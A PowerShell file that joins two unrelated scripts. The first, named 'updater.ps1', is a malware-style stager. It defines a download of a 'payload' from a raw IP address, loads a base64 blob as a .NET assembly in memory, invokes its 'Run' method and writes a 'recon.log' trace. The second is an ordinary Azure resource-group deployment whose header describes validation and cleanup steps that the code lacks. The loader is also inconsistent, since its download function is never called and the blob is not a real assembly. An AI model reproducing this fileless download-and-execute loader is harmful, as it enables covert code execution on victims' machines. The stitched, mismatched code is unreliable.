
<#
.SYNOPSIS
    Managed assembly acquisition and reflection workflow.

.DESCRIPTION
    Downloads or decodes a managed payload stage, loads it into the
    current AppDomain, then looks for a conventional entry method
    and invokes it only when present.

.NOTES
    The loader expects a managed payload stage.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://198.51.100.221:8080/payload.bin',
    [string]$TracePath = "$env:TEMP\recon.log",
    [int]$TimeoutSec = 132
)
$ErrorActionPreference = "Stop"

# Acquisition
function Get-StageAssemblyBytes {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 132
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

# Reflection
function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

Write-Verbose "Starting managed loader"
$AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpyc2FzY2pmZWU2')
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($AssemblyBytes)
$EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $TransferResult
Write-Verbose ("Entry result: " + $EntryResult)

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $AssemblyBytes.Length
    Endpoint = $PayloadUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Operation completed"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Applying operation timeout"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$ProgressPreference = "SilentlyContinue"
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.DESCRIPTION
    Runs a template validation first, then creates the resource group, the
    storage account and the test virtual machine before cleaning the sandbox up.
    The cleanup step honours the DryRun switch so the resources can be inspected
    after a failed deployment.
.EXAMPLE
    .\Deploy-PortalTest.ps1 -ResourceGroup rg-portal-test-07
.EXAMPLE
    .\Deploy-PortalTest.ps1 -Location uksouth -DryRun
#>

$ResourceGroup  = 'rg-portal-test-07'
$Location       = 'uksouth'
$TemplateFile   = "C:\Scripts\templates\portal-test.json"
$ParameterFile  = 'C:\Scripts\templates\portal-test.parameters.json'
$SubscriptionId = 'bcb882ac-b1f1-e5b9-2be7-b0c1ec0e8b36'
$StorageAccount = 'sttest8418'
$VmName         = 'vm-portal-test-07'
$OutputPath     = 'C:\Logs\deploy-test-2025-01-26.json'
$DryRun         = $false

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$ProgressPreference = 'SilentlyContinue'

Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}
$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
